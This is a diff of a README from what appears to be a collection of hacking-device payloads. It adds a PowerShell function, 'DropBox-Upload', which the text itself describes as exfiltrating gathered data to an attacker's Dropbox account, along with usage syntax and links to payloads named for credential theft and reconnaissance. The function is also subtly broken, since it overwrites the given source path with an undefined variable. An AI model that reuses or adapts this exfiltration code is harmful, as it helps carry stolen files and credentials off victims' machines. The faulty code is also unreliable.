@@ -12,23 +12,54 @@
   </ol>
 </details>
 
-# Name of your function
+# DropBox-Upload
 
 ## Description
 
-A short description of what your function accomplishes 
+This function is used to exfiltrate gathered data to DropBox 
 
 ## The Function
 
-### [FUNCTION-NAME] 
+### [DropBox-Upload] 
 
-A short description of how your function works
+First off for this function to work you need to have a DropBox account. Make one [HERE](https://www.dropbox.com).
+
+Follow this [GUIDE](https://developers.dropbox.com/oauth-guide) for setting up your DropBox account for uploads
+
+
+
+Use the following syntax for your upload:
 
 ```
-function YOUR-FUNCTION {
+DropBox-Upload -SourceFilePath "C:\Users\User\Desktop\file.txt"
 
-<Do the thing here>
+or
 
+"C:\Users\User\Desktop\file.txt" | DropBox-Upload
+```
+
+Make sure to plug in your newly aquired DropBox token in the $DropBoxAccessToken variable below
+
+```
+function DropBox-Upload {
+
+[CmdletBinding()]
+param (
+	
+[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+[string]$SourceFilePath
+) 
+
+$DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN"   # Replace with your DropBox Access Token
+$TargetFilePath="/$FileName"
+$SourceFilePath="$env:TMP\$FileName"
+$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+$authorization = "Bearer " + $DropBoxAccessToken
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", $authorization)
+$headers.Add("Dropbox-API-Arg", $arg)
+$headers.Add("Content-Type", 'application/octet-stream')
+Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 ```
 
@@ -39,10 +70,11 @@ function YOUR-FUNCTION {
 (Examples of script that have used your function) - delete this line
 Listed below are payloads that have used one of these functions:
 
-[Acid Burn](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-AcidBurn)
+[ADV-Recon](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-ADV-Recon)
 
-[JumpScare](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-JumpScare)
+[ET-Phone-Home](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-ET-Phone-Home)
 
+[Credz-Plz](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-Credz-Plz)
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
